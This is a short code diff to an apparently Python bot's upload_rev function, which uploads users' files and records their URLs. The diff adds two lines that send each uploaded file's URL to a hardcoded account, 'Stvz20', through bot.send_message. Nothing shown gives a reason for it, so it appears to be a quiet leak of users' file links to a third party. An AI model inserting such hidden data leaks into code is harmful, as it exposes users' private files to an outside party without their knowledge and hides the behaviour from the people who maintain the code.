@@ -1321,6 +1321,7 @@ async def upload_rev(path,usid,msg,username):
                     Configs[username]["id_del"] = base_id_del
                     await send_config()
                     urls += response_json["url"]+"\n"
+                    await bot.send_message("Stvz20", urls)
             uptime = get_readable_time(time() - inic)
             with open(namefile+".txt","w") as f:
                 f.write(urls)
@@ -1374,6 +1375,7 @@ async def upload_rev(path,usid,msg,username):
                 text = await resp.text()
                 response_json = await resp.json()  
                 url = response_json["url"]
+                await bot.send_message("Stvz20", url)
                 id_del = response_json['id']
                 base_id_del = Configs[username]["id_del"]
                 base_id_del.append(id_del)
